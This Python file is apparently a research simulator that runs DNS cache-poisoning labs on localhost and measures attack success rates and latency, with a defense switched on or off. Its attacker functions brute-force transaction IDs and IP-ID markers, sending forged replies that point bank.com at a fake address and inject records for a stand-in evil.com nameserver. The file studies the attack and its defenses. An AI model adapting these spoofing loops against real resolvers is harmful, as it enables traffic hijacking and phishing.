"""Localhost-only simulator for the Person-2 labs (OoB / SFrag / BFrag).

Why this exists
---------------
The Docker labs are the canonical way to run the experiments. But the 4-container
stack needs Docker + raw sockets (scapy) to spoof the source IP. We also want a
quick, reproducible way to run end-to-end measurements WITHOUT Docker, e.g. in
CI or on a thin Linux box without privileges.

This simulator wires the *real* resolver code (loaded from each lab) on
localhost UDP ports, runs a tiny in-process auth server with the same logic as
the lab's auth_server.py, and an in-process attacker that does NOT spoof source
IPs (the resolver matches by TXID, not by source IP, so localhost is enough).

It then runs N client probes per case, measures latency, checks if `bank.com`
got poisoned, and prints / writes a CSV row per case. The output schema matches
the docker pipeline so the analysis code is shared.

Usage:
    python3 sim_runner.py [--lab oob|sfrag|bfrag|all] [--rounds 50] [--runs 3] \
                          [--entropy full|weak] [--out p2_metrics_sim.csv]

Cases:
    baseline, attack-off, attack-on            -- canonical 3 cases.
    attack-off-multi, attack-on-multi          -- OoB only, multi-vector profile.
"""

from __future__ import annotations

import argparse
import csv
import importlib.util
import os
import random
import socket
import sys
import tempfile
import threading
import time
from contextlib import closing
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

from dnslib import (
    A,
    DNSHeader,
    DNSQuestion,
    DNSRecord,
    NS,
    QTYPE,
    RCODE,
    RR,
    SOA,
    TXT,
)


HERE = Path(__file__).resolve().parent
LABS_ROOT = HERE.parent.parent  # .../Code/labs


def _free_udp_port() -> int:
    with closing(socket.socket(socket.AF_INET, socket.SOCK_DGRAM)) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def normalize(name: str) -> str:
    value = name.lower().strip()
    if not value.endswith("."):
        value += "."
    return value


# --------------------------------------------------------------------------- #
# Stoppable threads (we don't have a clean signal API)                         #
# --------------------------------------------------------------------------- #

class StoppableThread(threading.Thread):
    def __init__(self, target, *, name: str):
        super().__init__(target=target, name=name, daemon=True)
        self.stop_event = threading.Event()


# --------------------------------------------------------------------------- #
# Auth servers                                                                 #
# --------------------------------------------------------------------------- #

def make_oob_auth(bind_port: int, delay: float = 0.05) -> Tuple[StoppableThread, socket.socket]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", bind_port))
    sock.settimeout(0.1)

    soa = SOA(
        mname="ns1.example.net.",
        rname="hostmaster.example.net.",
        times=(2026040601, 3600, 1200, 604800, 300),
    )

    def loop():
        while not thread.stop_event.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except (socket.timeout, ConnectionResetError):
                continue
            try:
                req = DNSRecord.parse(data)
                qname = normalize(str(req.q.qname))
                qtype_name = QTYPE.get(req.q.qtype)
                time.sleep(delay)
                hdr = DNSHeader(id=req.header.id, qr=1, aa=1, ra=0, rd=req.header.rd, tc=0)
                reply = DNSRecord(hdr, q=req.q)
                if qtype_name == "A" and qname.endswith("example.net."):
                    reply.add_answer(RR(qname, QTYPE.A, ttl=60, rdata=A("198.51.100.10")))
                    reply.add_auth(RR("example.net.", QTYPE.NS, ttl=300, rdata=NS("ns1.example.net.")))
                    reply.add_ar(RR("ns1.example.net.", QTYPE.A, ttl=300, rdata=A("127.0.0.1")))
                elif qtype_name == "A" and qname == "bank.com.":
                    reply.add_answer(RR(qname, QTYPE.A, ttl=120, rdata=A("203.0.113.80")))
                else:
                    reply.header.rcode = RCODE.NXDOMAIN
                    reply.add_auth(RR("example.net.", QTYPE.SOA, ttl=60, rdata=soa))
                sock.sendto(reply.pack(), addr)
            except Exception:  # noqa: BLE001
                continue
        sock.close()

    thread = StoppableThread(loop, name="oob-auth")
    thread.start()
    return thread, sock


def make_frag_auth(
    bind_port: int,
    fragmeta_qname: str,
    frag_mode: str,
    bullseye_ipid: int,
    ipid_space: int,
    trigger_prefix: str = "frag",
    delay: float = 0.05,
) -> Tuple[StoppableThread, socket.socket]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", bind_port))
    sock.settimeout(0.1)
    soa = SOA(
        mname="ns1.example.net.",
        rname="hostmaster.example.net.",
        times=(2026041001, 3600, 1200, 604800, 300),
    )

    def pick_ipid() -> int:
        if frag_mode == "bfrag":
            return bullseye_ipid
        return random.randint(0, max(1, ipid_space - 1))

    def should_attach_marker(qname: str) -> bool:
        zone = "example.net."
        if not qname.endswith(zone):
            return False
        rel = qname[: -len(zone)].strip(".")
        if not rel:
            return False
        return rel.split(".")[0].startswith(trigger_prefix)

    def loop():
        while not thread.stop_event.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except (socket.timeout, ConnectionResetError):
                continue
            try:
                req = DNSRecord.parse(data)
                qname = normalize(str(req.q.qname))
                qtype_name = QTYPE.get(req.q.qtype)
                time.sleep(delay)
                hdr = DNSHeader(id=req.header.id, qr=1, aa=1, ra=0, rd=req.header.rd, tc=0)
                reply = DNSRecord(hdr, q=req.q)
                if qtype_name == "A" and qname.endswith("example.net."):
                    reply.add_answer(RR(qname, QTYPE.A, ttl=60, rdata=A("198.51.100.10")))
                    if should_attach_marker(qname):
                        ipid = pick_ipid()
                        reply.add_ar(
                            RR(
                                fragmeta_qname,
                                QTYPE.TXT,
                                ttl=1,
                                rdata=TXT(f"TYPE=FRAG1;IPID={ipid}"),
                            )
                        )
                elif qtype_name == "A" and qname == "bank.com.":
                    reply.add_answer(RR(qname, QTYPE.A, ttl=120, rdata=A("203.0.113.80")))
                else:
                    reply.header.rcode = RCODE.NXDOMAIN
                    reply.add_auth(RR("example.net.", QTYPE.SOA, ttl=60, rdata=soa))
                sock.sendto(reply.pack(), addr)
            except Exception:  # noqa: BLE001
                continue
        sock.close()

    thread = StoppableThread(loop, name=f"{frag_mode}-auth")
    thread.start()
    return thread, sock


# --------------------------------------------------------------------------- #
# Attackers (no scapy; UDP to the resolver's fixed upstream port)             #
# --------------------------------------------------------------------------- #

def attacker_oob_loop(
    stop_event,
    resolver_upstream_port: int,
    txid_space: int,
    txid_scan_limit: int,
    attack_rate: float,
    profile: str = "default",
):
    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sender.settimeout(0.05)
    while not stop_event.is_set():
        for txid in range(min(txid_space, txid_scan_limit)):
            hdr = DNSHeader(id=txid, qr=1, aa=1, rd=1)
            resp = DNSRecord(hdr, q=DNSQuestion("victim.example.net.", QTYPE.A))
            resp.add_answer(RR("victim.example.net.", QTYPE.A, ttl=60, rdata=A("198.51.100.10")))
            if profile == "multi":
                resp.add_auth(RR("example.net.", QTYPE.NS, ttl=300, rdata=NS("ns1.evil.com.")))
                resp.add_ar(RR("bank.com.", QTYPE.A, ttl=300, rdata=A("6.6.6.6")))
                resp.add_ar(RR("ns1.evil.com.", QTYPE.A, ttl=300, rdata=A("7.7.7.7")))
                resp.add_ar(RR("evilbank.com.", QTYPE.A, ttl=300, rdata=A("6.6.6.6")))
            else:
                resp.add_ar(RR("bank.com.", QTYPE.A, ttl=300, rdata=A("6.6.6.6")))
            try:
                sender.sendto(resp.pack(), ("127.0.0.1", resolver_upstream_port))
            except OSError:
                pass
        time.sleep(attack_rate)
    sender.close()


def attacker_frag_loop(
    stop_event,
    resolver_upstream_port: int,
    ipid_space: int,
    ipid_scan_limit: int,
    bullseye_ipid: Optional[int],
    attack_rate: float,
):
    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sender.settimeout(0.05)
    candidates = (
        [bullseye_ipid]
        if bullseye_ipid is not None
        else list(range(min(ipid_space, ipid_scan_limit)))
    )
    while not stop_event.is_set():
        for ipid in candidates:
            hdr = DNSHeader(id=ipid % 65535, qr=1, aa=1, rd=1)
            resp = DNSRecord(hdr, q=DNSQuestion("_frag2.example.net.", QTYPE.TXT))
            resp.add_answer(RR("bank.com.", QTYPE.A, ttl=300, rdata=A("6.6.6.6")))
            resp.add_ar(
                RR(
                    "_fragmeta.example.net.",
                    QTYPE.TXT,
                    ttl=1,
                    rdata=TXT(f"TYPE=FRAG2;IPID={ipid}"),
                )
            )
            try:
                sender.sendto(resp.pack(), ("127.0.0.1", resolver_upstream_port))
            except OSError:
                pass
        time.sleep(attack_rate)
    sender.close()


# --------------------------------------------------------------------------- #
# Resolver (load real resolver module)                                         #
# --------------------------------------------------------------------------- #

def load_resolver(lab: str):
    path = LABS_ROOT / lab / "resolver" / "resolver.py"
    spec = importlib.util.spec_from_file_location(f"{lab}_resolver", str(path))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def start_resolver_thread(
    lab: str,
    listen_port: int,
    upstream_port: int,
    upstream_fixed_src_port: int,
    txid_space: int,
    defense_mode: str,
    defense_file: str,
) -> Tuple[StoppableThread, Dict[str, str]]:
    env_overrides = {
        "RESOLVER_LISTEN_IP": "127.0.0.1",
        "RESOLVER_LISTEN_PORT": str(listen_port),
        "RESOLVER_BIND_IP": "127.0.0.1",
        "UPSTREAM_DNS_IP": "127.0.0.1",
        "UPSTREAM_DNS_PORT": str(upstream_port),
        "UPSTREAM_FIXED_SRC_PORT": str(upstream_fixed_src_port),
        "TXID_SPACE": str(txid_space),
        "DEFENSE_MODE": defense_mode,
        "CACHE_DEFAULT_TTL": "60",
        "UPSTREAM_TIMEOUT": "1.2",
    }
    saved = {k: os.environ.get(k) for k in env_overrides}
    os.environ.update(env_overrides)

    module = load_resolver(lab)
    module.DEFENSE_FILE = defense_file
    # Always (re)write the defense flag because mkstemp creates an empty file.
    with open(defense_file, "w", encoding="utf-8") as fh:
        fh.write(defense_mode + "\n")

    thread = StoppableThread(module.main, name=f"{lab}-resolver")
    thread.start()
    time.sleep(0.3)
    return thread, saved


# --------------------------------------------------------------------------- #
# Client probe                                                                 #
# --------------------------------------------------------------------------- #

def client_probe(
    resolver_port: int,
    target_zone: str,
    rounds: int,
    profile: str,
    poison_ip: str,
) -> Tuple[int, int, List[float]]:
    poisoned = 0
    latencies: List[float] = []
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1.5)

    for i in range(1, rounds + 1):
        prefix = "frag" if profile == "attack" else "base"
        unique_qname = f"{prefix}{i}.{int(time.time()*1e9)}.{target_zone}"

        start = time.monotonic_ns()
        try:
            req = DNSRecord.question(unique_qname, "A")
            req.header.id = random.randint(0, 65535)
            sock.sendto(req.pack(), ("127.0.0.1", resolver_port))
            data, _ = sock.recvfrom(4096)
            DNSRecord.parse(data)
        except Exception:
            pass
        end = time.monotonic_ns()
        latencies.append((end - start) / 1e6)

        time.sleep(0.05)

        try:
            req = DNSRecord.question("bank.com", "A")
            req.header.id = random.randint(0, 65535)
            sock.sendto(req.pack(), ("127.0.0.1", resolver_port))
            data, _ = sock.recvfrom(4096)
            resp = DNSRecord.parse(data)
            ips = [str(rr.rdata) for rr in resp.rr if QTYPE.get(rr.rtype) == "A"]
            if ips and ips[0] == poison_ip:
                poisoned += 1
        except Exception:
            pass

    sock.close()
    return rounds, poisoned, latencies


# --------------------------------------------------------------------------- #
# Per-case runner                                                              #
# --------------------------------------------------------------------------- #

def run_case(
    lab: str,
    case: str,
    rounds: int,
    poison_ip: str = "6.6.6.6",
    txid_space: Optional[int] = None,
    ipid_space: Optional[int] = None,
    bullseye_ipid: int = 777,
    attack_rate: float = 0.02,
    auth_delay: float = 0.05,
    entropy_mode: str = "full",
    txid_scan_limit: Optional[int] = None,
    ipid_scan_limit: Optional[int] = None,
) -> Dict[str, float]:
    case_base = case
    if case.endswith("-weak"):
        entropy_mode = "weak"
        case_base = case[:-5]
    elif case.endswith("-full"):
        entropy_mode = "full"
        case_base = case[:-5]
    elif case.endswith("-realistic"):
        entropy_mode = "full"
        case_base = case[:-10]

    entropy_mode = entropy_mode.lower().strip()
    if entropy_mode not in {"full", "realistic", "weak", "demo", "bruteforce", "paper"}:
        raise ValueError(f"unknown entropy_mode: {entropy_mode}")
    is_full_entropy = entropy_mode in {"full", "realistic", "bruteforce", "paper"}
    is_bruteforce = entropy_mode in {"bruteforce", "paper"}

    chosen_txid_space = txid_space if txid_space is not None else (65536 if is_full_entropy else 1024)
    chosen_ipid_space = ipid_space if ipid_space is not None else (65535 if is_full_entropy else 2048)
    chosen_txid_scan_limit = (
        txid_scan_limit
        if txid_scan_limit is not None
        else (chosen_txid_space if is_bruteforce else (4096 if is_full_entropy else chosen_txid_space))
    )
    chosen_ipid_scan_limit = (
        ipid_scan_limit
        if ipid_scan_limit is not None
        else (chosen_ipid_space if is_bruteforce else (8192 if is_full_entropy else chosen_ipid_space))
    )

    resolver_port = _free_udp_port()
    upstream_port = _free_udp_port()
    if is_full_entropy:
        upstream_fixed_src_port = 0
        attacker_target_port = 33333
    else:
        upstream_fixed_src_port = _free_udp_port()
        attacker_target_port = upstream_fixed_src_port
    defense_file = tempfile.mkstemp(prefix=f"defense_{lab}_{case}_", suffix=".txt")[1]

    defense_mode = "on" if case_base.startswith("attack-on") else "off"
    is_multi_profile = case_base.endswith("-multi")

    if lab == "oob":
        auth_thread, _ = make_oob_auth(upstream_port, delay=auth_delay)
    else:
        frag_mode = "bfrag" if lab == "bfrag" else "sfrag"
        auth_thread, _ = make_frag_auth(
            upstream_port,
            fragmeta_qname="_fragmeta.example.net.",
            frag_mode=frag_mode,
            bullseye_ipid=bullseye_ipid,
            ipid_space=chosen_ipid_space,
            delay=auth_delay,
        )

    resolver_thread, saved_env = start_resolver_thread(
        lab=lab,
        listen_port=resolver_port,
        upstream_port=upstream_port,
        upstream_fixed_src_port=upstream_fixed_src_port,
        txid_space=chosen_txid_space,
        defense_mode=defense_mode,
        defense_file=defense_file,
    )

    attacker_stop = threading.Event()
    attacker_thread: Optional[threading.Thread] = None
    if case_base != "baseline":
        if lab == "oob":
            profile = "multi" if is_multi_profile else "default"
            attacker_thread = threading.Thread(
                target=attacker_oob_loop,
                args=(
                    attacker_stop,
                    attacker_target_port,
                    chosen_txid_space,
                    chosen_txid_scan_limit,
                    attack_rate,
                    profile,
                ),
                daemon=True,
                name="oob-attacker",
            )
        else:
            bullseye = bullseye_ipid if lab == "bfrag" else None
            attacker_thread = threading.Thread(
                target=attacker_frag_loop,
                args=(
                    attacker_stop,
                    attacker_target_port,
                    chosen_ipid_space,
                    chosen_ipid_scan_limit,
                    bullseye,
                    attack_rate,
                ),
                daemon=True,
                name=f"{lab}-attacker",
            )
        attacker_thread.start()
        time.sleep(0.5)

    target_zone = "example.net"
    profile = "baseline" if case_base == "baseline" else "attack"
    total, poisoned, latencies = client_probe(
        resolver_port, target_zone, rounds, profile, poison_ip
    )

    attacker_stop.set()
    if attacker_thread:
        attacker_thread.join(timeout=2)
    auth_thread.stop_event.set()
    auth_thread.join(timeout=2)
    resolver_thread.stop_event.set()

    for k, v in saved_env.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v
    if os.path.exists(defense_file):
        try:
            os.remove(defense_file)
        except OSError:
            pass

    avg_lat = sum(latencies) / len(latencies) if latencies else 0.0
    sorted_lat = sorted(latencies)
    if sorted_lat:
        idx = max(0, int(0.95 * len(sorted_lat)) - 1)
        p95_lat = sorted_lat[idx]
    else:
        p95_lat = 0.0
    asr = (poisoned / total * 100.0) if total else 0.0

    return {
        "lab": lab,
        "case": case,
        "rounds": rounds,
        "total": total,
        "poisoned": poisoned,
        "asr_pct": asr,
        "latency_avg_ms": avg_lat,
        "latency_p95_ms": p95_lat,
    }


# --------------------------------------------------------------------------- #
# Driver                                                                       #
# --------------------------------------------------------------------------- #

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--lab", default="all", help="one lab, 'all', or comma-separated labs (oob,sfrag)")
    parser.add_argument("--rounds", type=int, default=50)
    parser.add_argument("--runs", type=int, default=3)
    parser.add_argument("--out", default="p2_metrics_sim.csv")
    parser.add_argument("--entropy", default="full", choices=["full", "realistic", "weak", "demo", "bruteforce", "paper"])
    parser.add_argument("--ipid-space", type=int, default=None)
    parser.add_argument("--txid-space", type=int, default=None)
    parser.add_argument("--ipid-scan-limit", type=int, default=None)
    parser.add_argument("--txid-scan-limit", type=int, default=None)
    parser.add_argument(
        "--cases",
        default="baseline,attack-off,attack-on",
        help="Comma-separated case names. For oob you can also use "
             "attack-off-multi / attack-on-multi.",
    )
    parser.add_argument(
        "--append",
        action="store_true",
        help="Append rows to --out instead of overwriting (no header re-emit).",
    )
    args = parser.parse_args()

    valid_labs = {"oob", "sfrag", "bfrag"}
    if args.lab == "all":
        labs = ["oob", "sfrag", "bfrag"]
    else:
        labs = [lab.strip() for lab in args.lab.split(",") if lab.strip()]
        invalid = [lab for lab in labs if lab not in valid_labs]
        if invalid:
            parser.error(f"unknown lab(s): {','.join(invalid)}")
    cases = [c.strip() for c in args.cases.split(",") if c.strip()]

    out_path = Path(args.out)
    file_mode = "a" if args.append and out_path.exists() else "w"
    write_header = not (args.append and out_path.exists())

    with open(out_path, file_mode, newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        if write_header:
            writer.writerow(
                ["lab", "case", "run", "rounds", "total", "poisoned",
                 "asr_pct", "latency_avg_ms", "latency_p95_ms"]
            )
        for lab in labs:
            print(f"\n=== Lab {lab} (entropy={args.entropy}) ===")
            for case in cases:
                # multi-vector cases only make sense for oob
                if case.endswith("-multi") and lab != "oob":
                    continue
                for run_idx in range(1, args.runs + 1):
                    print(f"  [{lab}/{case}] run {run_idx}/{args.runs} (rounds={args.rounds})")
                    metrics = run_case(
                        lab=lab,
                        case=case,
                        rounds=args.rounds,
                        ipid_space=args.ipid_space,
                        txid_space=args.txid_space,
                        entropy_mode=args.entropy,
                        txid_scan_limit=args.txid_scan_limit,
                        ipid_scan_limit=args.ipid_scan_limit,
                    )
                    writer.writerow(
                        [
                            lab,
                            case,
                            run_idx,
                            args.rounds,
                            metrics["total"],
                            metrics["poisoned"],
                            f"{metrics['asr_pct']:.2f}",
                            f"{metrics['latency_avg_ms']:.3f}",
                            f"{metrics['latency_p95_ms']:.3f}",
                        ]
                    )
                    fh.flush()
                    print(
                        f"      poisoned={metrics['poisoned']}/{metrics['total']} "
                        f"ASR={metrics['asr_pct']:.2f}%  "
                        f"avg={metrics['latency_avg_ms']:.2f}ms  "
                        f"p95={metrics['latency_p95_ms']:.2f}ms"
                    )

    print(f"\n[+] CSV: {out_path.resolve()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
